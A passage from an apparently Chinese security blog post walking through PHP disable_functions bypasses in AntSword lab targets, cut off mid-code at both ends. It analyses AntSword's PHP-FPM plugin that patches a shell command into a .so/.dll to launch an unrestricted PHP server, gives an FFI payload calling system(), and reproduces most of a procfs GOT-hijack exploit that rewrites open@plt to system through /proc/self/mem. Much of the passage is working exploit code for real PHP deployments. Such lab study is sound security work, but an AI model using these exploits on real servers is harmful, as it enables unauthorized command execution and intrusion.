class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=fread(<span class="variable">$fp</span>, <span class="number">4096</span>))&#123;</span><br><span class="line">    <span class="variable">$response</span> .= <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"><span class="variable">$pos</span> = strpos(<span class="variable">$response</span>, <span class="string">&quot;\r\n\r\n&quot;</span>);</span><br><span class="line"><span class="variable">$response</span> = substr(<span class="variable">$response</span>, <span class="variable">$pos</span>+<span class="number">4</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$response</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>核心代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">... ...</span><br><span class="line">    </span><br><span class="line"><span class="variable">$headers</span>=get_client_header();</span><br><span class="line"><span class="variable">$host</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">61568</span>;</span><br><span class="line"><span class="variable">$errno</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$errstr</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$timeout</span> = <span class="number">30</span>;</span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;/index.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> .= <span class="string">&quot;?&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span> = fsockopen(<span class="variable">$host</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$timeout</span>);</span><br><span class="line"></span><br><span class="line">... ...</span><br></pre></td></tr></table></figure>
<p>可以看到它正在与<strong>61568</strong>端口进行通信（靶场中默认没有安装ps工具，需要手动安装：<code>apt upgrade &amp;&amp; apt install procps</code>）</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/e83awu5MdlghyNc.png" alt="image-20220105163713565"></p>
<p><code>/bin/sh -c php -n -S 127.0.0.1:61568 -t /var/www/html</code></p>
<p>看来是起了一个新的 PHP Server，-n 就是不使用 php.ini，从而实现了 bypass disable_functions。大致推测出是利用之前上传的 so 库实现的命令执行，然后跑了个 PHP Server。</p>
<p>根据扩展插件的项目仓库(<a target="_blank" rel="noopener" href="https://github.com/Medicean/as_bypass_php_disable_functions)，找到主要代码的位置：">https://github.com/Medicean/as_bypass_php_disable_functions)，找到主要代码的位置：</a> <code>core/php_fpm/index.js</code> 。</p>
<p>启动 PHP Server 的代码，然后生成 ext（so/dll扩展） 传到服务器上。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let port = Math.floor(Math.random() * <span class="number">5000</span>) + <span class="number">60000</span>; <span class="comment">// 60000~65000</span></span><br><span class="line">...</span><br><span class="line">let cmd = `$&#123;phpbinary&#125; -n -S <span class="number">127.0</span>.<span class="number">0.1</span>:$&#123;port&#125; -t $&#123;<span class="built_in">self</span>.top.infodata.phpself&#125;`;</span><br><span class="line">let fileBuffer = <span class="built_in">self</span>.generateExt(cmd);</span><br></pre></td></tr></table></figure>
<p>通过self.generateExt(cmd)生成了一个fileBuffer，然后通过下面代码传了上去。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">core.filemanager.upload_file(&#123;</span><br><span class="line">    path: ext_path,</span><br><span class="line">    content: fileBuffer</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>构造攻击 PHP-FPM 的 Payload，加载扩展库：</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/onALpiZ8bk4JIeP.png" alt="image-20220105171654433"></p>
<p>触发 Payload 后，就会执行启动一个新的 PHP Server。</p>
<p>后续 shell 都通过<code>.antproxy.php</code> 代理用 <strong>61568</strong> 的 PHP 解析，也就没有 disable_functions 了。</p>
<p>那么重点就在于generateExt函数了，这个在<code>core/base.js</code>里面。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成扩展</span></span><br><span class="line">generateExt(cmd) &#123;</span><br><span class="line">    let <span class="built_in">self</span> = this;</span><br><span class="line">    let fileBuff = fs.readFileSync(<span class="built_in">self</span>.ext_path);</span><br><span class="line">    let start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (<span class="built_in">self</span>.ext_name) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;ant_x86.so&#x27;</span>:</span><br><span class="line">        start = <span class="number">275</span>;</span><br><span class="line">        end = <span class="number">504</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;ant_x64.so&#x27;</span>:</span><br><span class="line">        <span class="comment">// 434-665</span></span><br><span class="line">        start = <span class="number">434</span>;</span><br><span class="line">        end = <span class="number">665</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;ant_x86.dll&#x27;</span>:</span><br><span class="line">        start = <span class="number">1544</span>;</span><br><span class="line">        end = <span class="number">1683</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;ant_x64.dll&#x27;</span>:</span><br><span class="line">        start = <span class="number">1552</span>;</span><br><span class="line">        end = <span class="number">1691</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(cmd.length &gt; (end - start)) &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fileBuff[end] = <span class="number">0</span>;</span><br><span class="line">    fileBuff.write(<span class="string">&quot;                    &quot;</span>, start);</span><br><span class="line">    fileBuff.write(cmd, start);</span><br><span class="line">    <span class="keyword">return</span> fileBuff;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>直接对二进制数据操作，在 start 到 end 中填入 cmd（就是前面说到的命令<code>/bin/sh -c php -n -S 127.0.0.1:61568 -t /var/www/html</code>）。</p>
<p>由于没有找到ext中so/dll的源码，只能放在IDA中逆向一下。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/EyaX7QCI1PVjvSZ.png" alt="image-20220105170725418"></p>
<p>简单粗暴，so/dll 文件给cmd留点位置，需要执行啥命令就写啥命令进去。然后执行 so/dll 就可以执行该命令了。</p>
<h2 id="利用-PHP7-4-FFI-扩展执行命令"><a href="#利用-PHP7-4-FFI-扩展执行命令" class="headerlink" title="利用 PHP7.4 FFI 扩展执行命令"></a>利用 PHP7.4 FFI 扩展执行命令</h2><p><strong>原理简介</strong>：</p>
<p>FFI（Foreign Function Interface），即外部函数接口。是指在一种语言里调用另一种语言代码的技术。PHP在7.4版本中新增加了此扩展，PHP 的 FFI 扩展就是一个让你在 PHP 里调用 C 代码的技术。FFI的使用只需声明和调用两步。</p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Linux 操作系统</li>
<li>PHP &gt;= 7.4</li>
<li>开启了 FFI 扩展且 <code>ffi.enable=true</code></li>
</ul>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/05/zCi6GTu8vEjJsRO.png" alt="image-20220105233955193"></p>
<p><strong>靶场环境</strong>：</p>
<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/8">https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions/8</a></p>
<p><strong>靶场突破</strong>：</p>
<p>上传EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);   <span class="comment"># 声明ffi，调用system函数</span></span><br><span class="line">    <span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;tac /flag &gt; /var/www/html/flag.txt&quot;</span>);   <span class="comment"># 执行命令读取flag</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/var/www/html/flag.txt&quot;</span>);</span><br><span class="line">    <span class="comment">// @unlink(&quot;/var/www/html/flag.txt&quot;);    # 删除flag.txt文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>直接访问提交即可。</p>
<h2 id="劫持-GOT-表"><a href="#劫持-GOT-表" class="headerlink" title="劫持 GOT 表"></a>劫持 GOT 表</h2><p><strong>原理简介</strong>：</p>
<p>在linux系统中，procfs 文件系统是个特殊的存在，对应的是 <code>/proc</code>目录，php 可以通过<code>/proc</code> 目录读写自己所在进程的内存，将非敏感函数地址替换成<code>glibc</code> 中的<code>system</code>地址，从而执行命令，其涉及的技术叫做 GOT表劫持。</p>
<p>通过正常函数实现敏感行为绕过 RASP ，举个例子，如果能将<code>open</code>函数地址换成<code>system</code>地址，那么便可以将<code>fopen</code>打开文件的命令，最终变成<code>glibc</code>调用<code>system</code>执行命令。</p>
<blockquote>
<p>详细原理讲解可参考：</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485666&amp;idx=1&amp;sn=71a0cce05637edd488cb9cccb3967504">https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485666&amp;idx=1&amp;sn=71a0cce05637edd488cb9cccb3967504</a></p>
</blockquote>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>内核版本&gt;=2.98</li>
<li>PHP &lt; 5.6</li>
<li>基于www权限的php-fpm/php-cgi work进程必须有权限读写 /proc/self/目录。</li>
<li>open_basedir=off（或者能绕过open_basedir读写 /lib/ 和/proc/）</li>
</ul>
<blockquote>
<p>注：apache+php 由于 apache调用setuid设置www权限工作进程，/proc/self/目录属于root用户，导致没有权限读写。</p>
<p>nginx+php，对于低版本的php -fpm www权限工作进程， /proc/self/目录属于www用户可以读写。经不完全测试，php&lt;5.6 版本是可以使用GOT表劫持。</p>
</blockquote>
<p><strong>靶场环境</strong>：</p>
<ul>
<li>Linux系统：CentOS 7.6（内核版本3.10.0）</li>
<li>Web服务：Nginx 1.18.0</li>
<li>PHP版本：5.4.16</li>
</ul>
<p><strong>靶场突破</strong>：</p>
<p>以下EXP来源：<a target="_blank" rel="noopener" href="https://github.com/beched/php_disable_functions_bypass">https://github.com/beched/php_disable_functions_bypass</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$libc_ver:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">beched<span class="doctag">@linuxoid</span> ~ $ php -r &#x27;readfile(&quot;/proc/self/maps&quot;);&#x27; | grep libc</span></span><br><span class="line"><span class="comment">7f3dfa609000-7f3dfa7c4000 r-xp 00000000 08:01 9831386                    /lib/x86_64-linux-gnu/libc-2.19.so</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$open_php:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">beched<span class="doctag">@linuxoid</span> ~ $ objdump -R /usr/bin/php | grep &#x27;\sopen$&#x27;</span></span><br><span class="line"><span class="comment">0000000000e94998 R_X86_64_JUMP_SLOT  open</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">$system_offset and $open_offset:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">beched<span class="doctag">@linuxoid</span> ~ $ readelf -s /lib/x86_64-linux-gnu/libc-2.19.so | egrep &quot;\s(system|open)@@&quot;</span></span><br><span class="line"><span class="comment">  1337: 0000000000046530    45 FUNC    WEAK   DEFAULT   12 system@<span class="doctag">@GLIBC</span>_2.2.5</span></span><br><span class="line"><span class="comment">  1679: 00000000000ec150    90 FUNC    WEAK   DEFAULT   12 open@<span class="doctag">@GLIBC</span>_2.2.5</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">packlli</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$higher</span> = (<span class="variable">$value</span> &amp; <span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$lower</span> = <span class="variable">$value</span> &amp; <span class="number">0x00000000ffffffff</span>;</span><br><span class="line">    <span class="keyword">return</span> pack(<span class="string">&#x27;V2&#x27;</span>, <span class="variable">$lower</span>, <span class="variable">$higher</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unp</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> hexdec(bin2hex(strrev(<span class="variable">$value</span>)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">parseelf</span>(<span class="params"><span class="variable">$bin_ver</span>, <span class="variable">$rela</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$bin</span> = file_get_contents(<span class="variable">$bin_ver</span>);</span><br><span class="line">    <span class="variable">$e_shoff</span> = unp(substr(<span class="variable">$bin</span>, <span class="number">0x28</span>, <span class="number">8</span>));</span><br><span class="line">    <span class="variable">$e_shentsize</span> = unp(substr(<span class="variable">$bin</span>, <span class="number">0x3a</span>, <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$e_shnum</span> = unp(substr(<span class="variable">$bin</span>, <span class="number">0x3c</span>, <span class="number">2</span>));</span><br><span class="line">    <span class="variable">$e_shstrndx</span> = unp(substr(<span class="variable">$bin</span>, <span class="number">0x3e</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_shnum</span>; <span class="variable">$i</span> += <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="variable">$sh_type</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">4</span>, <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$sh_type</span> == <span class="number">11</span>) &#123; <span class="comment">// SHT_DYNSYM</span></span><br><span class="line">            <span class="variable">$dynsym_off</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">24</span>, <span class="number">8</span>));</span><br><span class="line">            <span class="variable">$dynsym_size</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">32</span>, <span class="number">8</span>));</span><br><span class="line">            <span class="variable">$dynsym_entsize</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">56</span>, <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(!<span class="keyword">isset</span>(<span class="variable">$strtab_off</span>) &amp;&amp; <span class="variable">$sh_type</span> == <span class="number">3</span>) &#123; <span class="comment">// SHT_STRTAB</span></span><br><span class="line">            <span class="variable">$strtab_off</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">24</span>, <span class="number">8</span>));</span><br><span class="line">            <span class="variable">$strtab_size</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">32</span>, <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">elseif</span>(<span class="variable">$rela</span> &amp;&amp; <span class="variable">$sh_type</span> == <span class="number">4</span>) &#123; <span class="comment">// SHT_RELA</span></span><br><span class="line">            <span class="variable">$relaplt_off</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">24</span>, <span class="number">8</span>));</span><br><span class="line">            <span class="variable">$relaplt_size</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">32</span>, <span class="number">8</span>));</span><br><span class="line">            <span class="variable">$relaplt_entsize</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$e_shoff</span> + <span class="variable">$i</span> * <span class="variable">$e_shentsize</span> + <span class="number">56</span>, <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$rela</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="variable">$relaplt_off</span>; <span class="variable">$i</span> &lt; <span class="variable">$relaplt_off</span> + <span class="variable">$relaplt_size</span>; <span class="variable">$i</span> += <span class="variable">$relaplt_entsize</span>) &#123;</span><br><span class="line">            <span class="variable">$r_offset</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$i</span>, <span class="number">8</span>));</span><br><span class="line">            <span class="variable">$r_info</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$i</span> + <span class="number">8</span>, <span class="number">8</span>)) &gt;&gt; <span class="number">32</span>;</span><br><span class="line">            <span class="variable">$name_off</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$dynsym_off</span> + <span class="variable">$r_info</span> * <span class="variable">$dynsym_entsize</span>, <span class="number">4</span>));</span><br><span class="line">            <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$j</span> = <span class="variable">$strtab_off</span> + <span class="variable">$name_off</span> - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$bin</span>[++<span class="variable">$j</span>] != <span class="string">&quot;\0&quot;</span>) &#123;</span><br><span class="line">                <span class="variable">$name</span> .= <span class="variable">$bin</span>[<span class="variable">$j</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$name</span> == <span class="string">&#x27;open&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$r_offset</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="variable">$dynsym_off</span>; <span class="variable">$i</span> &lt; <span class="variable">$dynsym_off</span> + <span class="variable">$dynsym_size</span>; <span class="variable">$i</span> += <span class="variable">$dynsym_entsize</span>) &#123;</span><br><span class="line">            <span class="variable">$name_off</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$i</span>, <span class="number">4</span>));</span><br><span class="line">            <span class="variable">$name</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$j</span> = <span class="variable">$strtab_off</span> + <span class="variable">$name_off</span> - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(<span class="variable">$bin</span>[++<span class="variable">$j</span>] != <span class="string">&quot;\0&quot;</span>) &#123;</span><br><span class="line">                <span class="variable">$name</span> .= <span class="variable">$bin</span>[<span class="variable">$j</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$name</span> == <span class="string">&#x27;__libc_system&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$system_offset</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$i</span> + <span class="number">8</span>, <span class="number">8</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$name</span> == <span class="string">&#x27;__open&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$open_offset</span> = unp(substr(<span class="variable">$bin</span>, <span class="variable">$i</span> + <span class="number">8</span>, <span class="number">8</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="variable">$system_offset</span>, <span class="variable">$open_offset</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[*] PHP disable_functions procfs bypass (coded by Beched, RDot.Org)\n&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(strpos(php_uname(<span class="string">&#x27;a&#x27;</span>), <span class="string">&#x27;x86_64&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[-] This exploit is for x64 Linux. Exiting\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(substr(php_uname(<span class="string">&#x27;r&#x27;</span>), <span class="number">0</span>, <span class="number">4</span>) &lt; <span class="number">2.98</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[-] Too old kernel (&lt; 2.98). Might not work\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[*] Trying to get open@plt offset in PHP binary\n&quot;</span>;</span><br><span class="line"><span class="variable">$open_php</span> = parseelf(<span class="string">&#x27;/proc/self/exe&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$open_php</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[-] Failed. Exiting\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[+] Offset is 0x&#x27;</span> . dechex(<span class="variable">$open_php</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$maps</span> = file_get_contents(<span class="string">&#x27;/proc/self/maps&#x27;</span>);</span><br><span class="line">preg_match(<span class="string">&#x27;#\s+(/.+libc\-.+)#&#x27;</span>, <span class="variable">$maps</span>, <span class="variable">$r</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[*] Libc location: <span class="subst">$r</span>[1]\n&quot;</span>;</span><br><span class="line"><span class="variable">$pie_base</span> = hexdec(explode(<span class="string">&#x27;-&#x27;</span>, <span class="variable">$maps</span>)[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] PIE base: 0x&#x27;</span> . dechex(<span class="variable">$pie_base</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[*] Trying to get open and system symbols from Libc\n&quot;</span>;</span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$system_offset</span>, <span class="variable">$open_offset</span>) = parseelf(<span class="variable">$r</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$system_offset</span> == <span class="number">0</span> <span class="keyword">or</span> <span class="variable">$open_offset</span> == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[-] Failed. Exiting\n&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[+] Got them. Seeking for address in memory\n&quot;</span>;</span><br><span class="line"><span class="variable">$mem</span> = fopen(<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>);</span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$pie_base</span> + <span class="variable">$open_php</span>);</span><br><span class="line"><span class="variable">$open_addr</span> = unp(fread(<span class="variable">$mem</span>, <span class="number">8</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] open@plt addr: 0x&#x27;</span> . dechex(<span class="variable">$open_addr</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$libc_start</span> = <span class="variable">$open_addr</span> - <span class="variable">$open_offset</span>;</span><br><span class="line"><span class="variable">$system_addr</span> = <span class="variable">$libc_start</span> + <span class="variable">$system_offset</span>;</span><br><span class="line"><span class="keyword">echo</span> <span 